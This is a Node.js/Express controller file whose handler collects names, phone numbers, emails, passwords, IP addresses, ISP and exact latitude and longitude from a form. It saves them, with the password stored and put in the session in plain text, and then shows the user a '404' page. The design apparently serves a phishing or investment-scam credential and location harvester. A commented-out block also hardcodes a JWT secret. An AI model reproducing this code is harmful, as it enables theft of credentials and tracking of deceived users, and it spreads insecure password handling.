const Just = require("../model/usermodel");
// const crypto = require("crypto");
const bcrypt = require("bcryptjs");
require("dotenv").config();
const jwt = require('jsonwebtoken');






const enter = async (req, res) => {
  try {
      const { fullname, phoneNumber, nickname, email, password, ipadd, country, region, city, isp, lat, lon, localink} = req.body;

      if (!fullname || !phoneNumber || !nickname || !email || !password || !ipadd ||!country || !region || !city || !isp || !lat || !lon || !localink) {
          res.render("invest/Investment/404", { user: req.session.user });
      } else {
          await createuser();
      }

      async function createuser() {
          const user = new Just({
              fullname,
              phoneNumber,
              nickname,
              email,
              password,
              ipadd,
              country,
              region,
              city,
              isp,
              lat,
              lon,
              localink,
          });

          

          try {
              await user.save();
              console.log('User saved successfully');

              // Update session
              req.session.user = {
                  id: user._id,
                  ipadd: user.ipadd,
                  email: user.email,
                  fullname: user.fullname,
                  phoneNumber: user.phoneNumber,
                  nickname: user.nickname,
                  password: user.password,
                  country: user.country,
                  region: user.region,
                  city: user.city,
                  isp: user.isp,
                  latitude: user.lat,
                  longitude: user.lon,
                  LocationLink: user.localink
              };

             
              res.render("404", { user: req.session.user });
          } catch (error) {
              console.error('Error saving user:', error);
              res.status(500).render("/404", { user: req.session.user });
          }
      }
  } catch (error) {
      console.error("Error during signup:", error);

      // Handle errors and ensure only one response
      if (!res.headersSent) {
          res.status(500).json({ status: "Failed", message: error.message });
      }
  }
};




// const troy = async (req, res) => {
//   try {
//     const { troy,} = req.body;

//     if (!troy) {
//       res.render("invest/Investment/404", {user: req.session.user})
//       // return res.status(400).json({ status: "Failed", message: "Please fill out all fields." });
    
//     } else{
//       createuser()
  
      
//     }

//     async function createuser(){

//        // Create a new user with the provided data and the image URL if available
//     const user = new Troy({
//       troy,
//     });


//       try {
//           await user.save();
//           // Generate a JWT token
//           const token = jwt.sign({ id: user._id}, 'Adain', { expiresIn: '1h' });

//           req.session.user = {
//               id: user._id,
//               troy: user.troy,
             
              
//           };
//           res.render("404", {user: req.session.user})
          
          
//       } catch (error) {
//         res.render("404", {user: req.session.user})
//       }
//     }

   

    

   
//   } catch (error) {
//     console.error("Error during signup:", error);

//     if (!res.headersSent) {
//       res.status(500).json({ status: "Failed", message: error.message });
//     }
//   }

  


// };





module.exports =
{

  enter,
 
};